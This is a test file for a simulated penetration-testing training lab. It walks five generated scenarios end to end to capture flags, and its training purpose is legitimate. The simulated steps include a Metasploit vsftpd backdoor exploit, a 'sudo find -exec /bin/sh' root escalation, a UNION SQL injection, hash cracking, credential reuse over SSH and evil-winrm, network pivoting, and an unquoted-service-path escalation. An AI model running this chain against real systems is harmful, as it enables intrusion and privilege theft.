import { describe, expect, it } from "vitest";
import { createRng } from "@/lib/generators/rng";
import {
  createInitialNetRangeState,
  execNetRangeCommand,
} from "@/lib/lab-engine/netrange/engine";
import type { NetRangeScenario } from "@/lib/lab-engine/netrange/types";
import { netrangeFootholdPrivesc } from "@/lib/generators/netrange/netrange-foothold-privesc";
import { netrangeWebCredReuse } from "@/lib/generators/netrange/netrange-web-cred-reuse";
import { netrangePivotInternal } from "@/lib/generators/netrange/netrange-pivot-internal";
import { netrangeWindowsSmbPrivesc } from "@/lib/generators/netrange/netrange-windows-smb-privesc";
import { netrangeMiniExam } from "@/lib/generators/netrange/netrange-mini-exam";

describe("NetRange Scenarios Automated Solver Suites (>= 5 seeds each)", () => {
  describe("Scenario A: Single Host Foothold -> Privesc (netrange_foothold_privesc)", () => {
    const seeds = ["solver-a-seed-1", "solver-a-seed-2", "solver-a-seed-3", "solver-a-seed-4", "solver-a-seed-5"];

    for (const seed of seeds) {
      it(`solves Scenario A end-to-end with seed "${seed}"`, () => {
        const rng = createRng(seed);
        const lab = netrangeFootholdPrivesc(rng, {});
        const scenario = (lab.env as { network: { scenario: NetRangeScenario } }).network.scenario;
        let state = createInitialNetRangeState(scenario);

        // 1. Service enumeration
        const nmapRes = execNetRangeCommand("nmap -sV 192.0.2.50", state, scenario);
        expect(nmapRes.stdout).toContain("vsftpd 2.3.4");
        state = nmapRes.nextState;

        // 2. Metasploit exploitation
        state = execNetRangeCommand("msfconsole", state, scenario).nextState;
        state = execNetRangeCommand("use exploit/unix/ftp/vsftpd_234_backdoor", state, scenario).nextState;
        state = execNetRangeCommand("set RHOSTS 192.0.2.50", state, scenario).nextState;
        const exploitRes = execNetRangeCommand("exploit", state, scenario);
        expect(exploitRes.stdout).toContain("Command shell session 1 opened");
        state = exploitRes.nextState;

        // 3. Extract foothold flag
        const catRes = execNetRangeCommand("cat /home/operator/flag.txt", state, scenario);
        const matchFoothold = catRes.stdout.match(/PENTEST\{foothold_[a-f0-9]+\}/);
        expect(matchFoothold).not.toBeNull();
        const footholdFlag = matchFoothold![0];
        expect(footholdFlag).toBe(lab.answers.flag_foothold);

        const sub1 = execNetRangeCommand(`submit 1 ${footholdFlag}`, state, scenario);
        expect(sub1.submit?.answer).toBe(lab.answers.flag_foothold);

        // 4. Privilege escalation via sudo find GTFOBins
        const sudoL = execNetRangeCommand("sudo -l", state, scenario);
        expect(sudoL.stdout).toContain("NOPASSWD: /usr/bin/find");
        state = sudoL.nextState;

        const privescRes = execNetRangeCommand("sudo find . -exec /bin/sh \\;", state, scenario);
        expect(privescRes.stdout).toContain("Spawning root shell");
        state = privescRes.nextState;
        expect(state.currentUser).toBe("root");

        // 5. Extract root flag
        const rootCat = execNetRangeCommand("cat /root/flag.txt", state, scenario);
        const matchRoot = rootCat.stdout.match(/PENTEST\{root_privesc_[a-f0-9]+\}/);
        expect(matchRoot).not.toBeNull();
        const rootFlag = matchRoot![0];
        expect(rootFlag).toBe(lab.answers.flag_root);

        const sub2 = execNetRangeCommand(`submit 2 ${rootFlag}`, state, scenario);
        expect(sub2.submit?.answer).toBe(lab.answers.flag_root);
      });
    }
  });

  describe("Scenario B: Web Foothold -> Credential Reuse (netrange_web_cred_reuse)", () => {
    const seeds = ["solver-b-seed-1", "solver-b-seed-2", "solver-b-seed-3", "solver-b-seed-4", "solver-b-seed-5"];

    for (const seed of seeds) {
      it(`solves Scenario B end-to-end with seed "${seed}"`, () => {
        const rng = createRng(seed);
        const lab = netrangeWebCredReuse(rng, {});
        const scenario = (lab.env as { network: { scenario: NetRangeScenario } }).network.scenario;
        let state = createInitialNetRangeState(scenario);

        // 1. Discover web portal & backup dump
        const webRes = execNetRangeCommand("curl http://192.0.2.80/", state, scenario);
        expect(webRes.stdout).toContain("/backup/db_backup.sql");
        state = webRes.nextState;

        // 2. Extract credentials and web flag from SQL dump
        const sqlRes = execNetRangeCommand("curl http://192.0.2.80/backup/db_backup.sql", state, scenario);
        const matchWeb = sqlRes.stdout.match(/PENTEST\{web_cred_[a-f0-9]+\}/);
        expect(matchWeb).not.toBeNull();
        const flagWeb = matchWeb![0];
        expect(flagWeb).toBe(lab.answers.flag_web);

        const sub1 = execNetRangeCommand(`submit 1 ${flagWeb}`, state, scenario);
        expect(sub1.submit?.answer).toBe(lab.answers.flag_web);

        // 3. Credential reuse via SSH to apex-db01 (192.0.2.90)
        const sshRes = execNetRangeCommand("ssh svc_deploy@192.0.2.90", state, scenario);
        expect(sshRes.code).toBe(0);
        expect(sshRes.stdout).toContain("Welcome to apex-db01");
        state = sshRes.nextState;
        expect(state.currentHostId).toBe("apex-db01");
        expect(state.currentUser).toBe("svc_deploy");

        // 4. Extract database server flag
        const dbFlagRes = execNetRangeCommand("cat /home/svc_deploy/flag.txt", state, scenario);
        const matchReuse = dbFlagRes.stdout.match(/PENTEST\{cred_reuse_[a-f0-9]+\}/);
        expect(matchReuse).not.toBeNull();
        const flagReuse = matchReuse![0];
        expect(flagReuse).toBe(lab.answers.flag_cred_reuse);

        const sub2 = execNetRangeCommand(`submit 2 ${flagReuse}`, state, scenario);
        expect(sub2.submit?.answer).toBe(lab.answers.flag_cred_reuse);
      });
    }
  });

  describe("Scenario C: Windows SMB Recon & Service PrivEsc (netrange_windows_smb_privesc)", () => {
    const seeds = ["solver-c-seed-1", "solver-c-seed-2", "solver-c-seed-3", "solver-c-seed-4", "solver-c-seed-5"];

    for (const seed of seeds) {
      it(`solves Scenario C end-to-end with seed "${seed}"`, () => {
        const rng = createRng(seed);
        const lab = netrangeWindowsSmbPrivesc(rng, {});
        const scenario = (lab.env as { network: { scenario: NetRangeScenario } }).network.scenario;
        let state = createInitialNetRangeState(scenario);

        // 1. SMB enumeration & share inspection
        const smbEnum = execNetRangeCommand("enum4linux-ng 192.0.2.120", state, scenario);
        expect(smbEnum.stdout).toContain("engineering");
        state = smbEnum.nextState;

        // 2. Download contractor_notes.txt from engineering share
        const smbGet = execNetRangeCommand("smbclient //192.0.2.120/engineering -c 'get contractor_notes.txt'", state, scenario);
        expect(smbGet.code).toBe(0);
        state = smbGet.nextState;

        // 3. Read notes and extract foothold flag + credentials
        const catNotes = execNetRangeCommand("cat contractor_notes.txt", state, scenario);
        const matchSmb = catNotes.stdout.match(/PENTEST\{smb_win_[a-f0-9]+\}/);
        expect(matchSmb).not.toBeNull();
        const flagSmb = matchSmb![0];
        expect(flagSmb).toBe(lab.answers.flag_smb);

        const sub1 = execNetRangeCommand(`submit 1 ${flagSmb}`, state, scenario);
        expect(sub1.submit?.answer).toBe(lab.answers.flag_smb);

        const matchPass = catNotes.stdout.match(/Temporary Pass: (ContractorPass[a-f0-9]+!)/);
        expect(matchPass).not.toBeNull();
        const contractorPass = matchPass![1];

        // 4. Remote access via evil-winrm
        const winrmRes = execNetRangeCommand(`evil-winrm -i 192.0.2.120 -u contractor -p ${contractorPass}`, state, scenario);
        expect(winrmRes.code).toBe(0);
        expect(winrmRes.stdout).toContain("Evil-WinRM shell");
        state = winrmRes.nextState;
        expect(state.currentHostId).toBe("win-srv01");
        expect(state.currentUser).toBe("contractor");

        // 5. Query service configuration to find unquoted binary path
        const scQc = execNetRangeCommand("sc qc ApexBackupSvc", state, scenario);
        expect(scQc.stdout).toContain("C:\\Program Files\\Apex Backup Solutions\\backup_agent.exe");
        expect(scQc.stdout).toContain("LocalSystem");
        state = scQc.nextState;

        // 6. Elevate privileges by starting the misconfigured service
        const scStart = execNetRangeCommand("sc start ApexBackupSvc", state, scenario);
        expect(scStart.stdout).toContain("Elevated session spawned: NT AUTHORITY\\SYSTEM");
        state = scStart.nextState;
        expect(state.currentUser).toBe("Administrator");

        // 7. Retrieve Administrator flag
        const catAdmin = execNetRangeCommand("type C:\\Users\\Administrator\\flag.txt", state, scenario);
        const matchPriv = catAdmin.stdout.match(/PENTEST\{win_privesc_[a-f0-9]+\}/);
        expect(matchPriv).not.toBeNull();
        const flagPriv = matchPriv![0];
        expect(flagPriv).toBe(lab.answers.flag_privesc);

        const sub2 = execNetRangeCommand(`submit 2 ${flagPriv}`, state, scenario);
        expect(sub2.submit?.answer).toBe(lab.answers.flag_privesc);
      });
    }
  });

  describe("Scenario D: 3-Host DMZ Web Foothold -> Gateway Pivot -> Internal Vault (netrange_pivot_internal)", () => {
    const seeds = ["solver-d-seed-1", "solver-d-seed-2", "solver-d-seed-3", "solver-d-seed-4", "solver-d-seed-5"];

    for (const seed of seeds) {
      it(`solves Scenario D end-to-end with seed "${seed}"`, () => {
        const rng = createRng(seed);
        const lab = netrangePivotInternal(rng, {});
        const scenario = (lab.env as { network: { scenario: NetRangeScenario } }).network.scenario;
        let state = createInitialNetRangeState(scenario);

        // 1. Discover DMZ web portal and diagnostics
        const dmzRes = execNetRangeCommand("curl http://192.0.2.60/api/diagnostics", state, scenario);
        const matchDmz = dmzRes.stdout.match(/PENTEST\{dmz_web_[a-f0-9]+\}/);
        expect(matchDmz).not.toBeNull();
        const flagDmz = matchDmz![0];
        expect(flagDmz).toBe(lab.answers.flag_dmz);

        const sub1 = execNetRangeCommand(`submit 1 ${flagDmz}`, state, scenario);
        expect(sub1.submit?.answer).toBe(lab.answers.flag_dmz);

        // 2. SSH into gateway router using credentials from DMZ host
        const sshGw = execNetRangeCommand("ssh pivotuser@192.0.2.100", state, scenario);
        expect(sshGw.code).toBe(0);
        state = sshGw.nextState;
        expect(state.currentHostId).toBe("apex-gw01");

        // Read gateway flag
        const catGw = execNetRangeCommand("cat /home/pivotuser/flag.txt", state, scenario);
        const matchGw = catGw.stdout.match(/PENTEST\{pivot_gw_[a-f0-9]+\}/);
        expect(matchGw).not.toBeNull();
        const flagGw = matchGw![0];
        expect(flagGw).toBe(lab.answers.flag_gateway);

        const sub2 = execNetRangeCommand(`submit 2 ${flagGw}`, state, scenario);
        expect(sub2.submit?.answer).toBe(lab.answers.flag_gateway);

        // 3. Inspect interfaces on gateway to see 172.16.50.10/24
        const ifconfigRes = execNetRangeCommand("ifconfig", state, scenario);
        expect(ifconfigRes.stdout).toContain("172.16.50.10");

        // 4. Return to Kali and add pivot route
        state = execNetRangeCommand("exit", state, scenario).nextState;
        expect(state.currentHostId).toBeNull();

        state = execNetRangeCommand("ip route add 172.16.50.0/24 via 192.0.2.100", state, scenario).nextState;
        expect(state.routes).toContain("172.16.50.0/24");

        // 5. Access internal vault API
        const vaultRes = execNetRangeCommand("curl http://172.16.50.25:8080/api/crown_jewel", state, scenario);
        const matchInternal = vaultRes.stdout.match(/PENTEST\{internal_crown_[a-f0-9]+\}/);
        expect(matchInternal).not.toBeNull();
        const flagInternal = matchInternal![0];
        expect(flagInternal).toBe(lab.answers.flag_internal);

        const sub3 = execNetRangeCommand(`submit 3 ${flagInternal}`, state, scenario);
        expect(sub3.submit?.answer).toBe(lab.answers.flag_internal);
      });
    }
  });

  describe("Scenario E: eJPT Mini-Exam Rehearsal - 4 Hosts Across 2 Subnets (netrange_mini_exam)", () => {
    const seeds = ["solver-e-seed-1", "solver-e-seed-2", "solver-e-seed-3", "solver-e-seed-4", "solver-e-seed-5"];

    for (const seed of seeds) {
      it(`solves Scenario E end-to-end with seed "${seed}"`, () => {
        const rng = createRng(seed);
        const lab = netrangeMiniExam(rng, {});
        const scenario = (lab.env as { network: { scenario: NetRangeScenario } }).network.scenario;
        let state = createInitialNetRangeState(scenario);

        // Phase 1: Web SQL Injection on exam-web01 (192.0.2.10)
        const sqliUrl = "curl 'http://192.0.2.10/portal/users.php?id=1+UNION+SELECT+1,username,password_hash+FROM+users'";
        const webRes = execNetRangeCommand(sqliUrl, state, scenario);
        const matchWeb = webRes.stdout.match(/PENTEST\{exam_web_[a-f0-9]+\}/);
        expect(matchWeb).not.toBeNull();
        const flagWeb = matchWeb![0];
        expect(flagWeb).toBe(lab.answers.flag_web);

        const sub1 = execNetRangeCommand(`submit 1 ${flagWeb}`, state, scenario);
        expect(sub1.submit?.answer).toBe(lab.answers.flag_web);

        // Extract gw_operator MD5 hash from SQL response
        const matchHash = webRes.stdout.match(/"username":\s*"gw_operator",\s*"hash_type":\s*"MD5",\s*"hash":\s*"([a-f0-9]{32})"/);
        expect(matchHash).not.toBeNull();

        // Phase 2: Hash cracking & Linux privesc on exam-gw01 (192.0.2.20)
        const hashcatRes = execNetRangeCommand("hashcat -m 0 hashes.txt rockyou.txt", state, scenario);
        expect(hashcatRes.stdout).toContain("Cracked");
        state = hashcatRes.nextState;

        // SSH into exam-gw01
        state = execNetRangeCommand("ssh gw_operator@192.0.2.20", state, scenario).nextState;
        expect(state.currentHostId).toBe("exam-gw01");

        // Escalate via sudo find GTFOBins
        state = execNetRangeCommand("sudo find . -exec /bin/sh \\;", state, scenario).nextState;
        expect(state.currentUser).toBe("root");

        // Read gateway flag
        const gwCat = execNetRangeCommand("cat /root/flag.txt", state, scenario);
        const matchGw = gwCat.stdout.match(/PENTEST\{exam_gw_[a-f0-9]+\}/);
        expect(matchGw).not.toBeNull();
        const flagGw = matchGw![0];
        expect(flagGw).toBe(lab.answers.flag_gateway);

        const sub2 = execNetRangeCommand(`submit 2 ${flagGw}`, state, scenario);
        expect(sub2.submit?.answer).toBe(lab.answers.flag_gateway);

        // Discover internal subnet 172.16.20.0/24 from notes
        const notesCat = execNetRangeCommand("cat /home/gw_operator/notes.txt", state, scenario);
        expect(notesCat.stdout).toContain("172.16.20.0/24");

        // Phase 3: Pivot and Metasploit vsftpd exploitation on exam-internal01 (172.16.20.30)
        state = execNetRangeCommand("exit", state, scenario).nextState; // exit root
        state = execNetRangeCommand("exit", state, scenario).nextState; // exit gw to Kali

        // Configure pivot route
        state = execNetRangeCommand("ip route add 172.16.20.0/24 via 192.0.2.20", state, scenario).nextState;

        // Launch Metasploit against internal target
        state = execNetRangeCommand("msfconsole", state, scenario).nextState;
        state = execNetRangeCommand("use exploit/unix/ftp/vsftpd_234_backdoor", state, scenario).nextState;
        state = execNetRangeCommand("set RHOSTS 172.16.20.30", state, scenario).nextState;
        const msfExploit = execNetRangeCommand("exploit", state, scenario);
        expect(msfExploit.stdout).toContain("Command shell session");
        state = msfExploit.nextState;
        expect(state.currentHostId).toBe("exam-internal01");

        // Read internal app flag
        const internalCat = execNetRangeCommand("cat /home/appuser/flag.txt", state, scenario);
        const matchInternal = internalCat.stdout.match(/PENTEST\{exam_internal_[a-f0-9]+\}/);
        expect(matchInternal).not.toBeNull();
        const flagInternal = matchInternal![0];
        expect(flagInternal).toBe(lab.answers.flag_internal);

        const sub3 = execNetRangeCommand(`submit 3 ${flagInternal}`, state, scenario);
        expect(sub3.submit?.answer).toBe(lab.answers.flag_internal);

        // Extract Windows domain credentials from app server
        const adNotes = execNetRangeCommand("cat /home/appuser/ad_credentials.txt", state, scenario);
        const matchWinPass = adNotes.stdout.match(/Password: (WinAnalyst[a-f0-9]+!)/);
        expect(matchWinPass).not.toBeNull();
        const winPass = matchWinPass![1];

        // Phase 4: Windows access & service misconfig privesc on exam-win01 (172.16.20.40)
        state = execNetRangeCommand("exit", state, scenario).nextState; // leave app server to Kali

        const winAccess = execNetRangeCommand(`evil-winrm -i 172.16.20.40 -u win_analyst -p ${winPass}`, state, scenario);
        expect(winAccess.code).toBe(0);
        state = winAccess.nextState;
        expect(state.currentHostId).toBe("exam-win01");

        // Check service unquoted path
        const scCheck = execNetRangeCommand("sc qc ApexMaintenanceSvc", state, scenario);
        expect(scCheck.stdout).toContain("C:\\Program Files\\Apex Maintenance Suite\\maint_agent.exe");
        expect(scCheck.stdout).toContain("LocalSystem");

        // Trigger service elevation to SYSTEM
        const scTrigger = execNetRangeCommand("sc start ApexMaintenanceSvc", state, scenario);
        expect(scTrigger.stdout).toContain("Elevated session spawned: NT AUTHORITY\\SYSTEM");
        state = scTrigger.nextState;
        expect(state.currentUser).toBe("Administrator");

        // Read capstone crown jewel flag
        const crownCat = execNetRangeCommand("type C:\\Users\\Administrator\\flag.txt", state, scenario);
        const matchCrown = crownCat.stdout.match(/PENTEST\{exam_win_crown_[a-f0-9]+\}/);
        expect(matchCrown).not.toBeNull();
        const flagCrown = matchCrown![0];
        expect(flagCrown).toBe(lab.answers.flag_crown);

        const sub4 = execNetRangeCommand(`submit 4 ${flagCrown}`, state, scenario);
        expect(sub4.submit?.answer).toBe(lab.answers.flag_crown);
      });
    }
  });
});
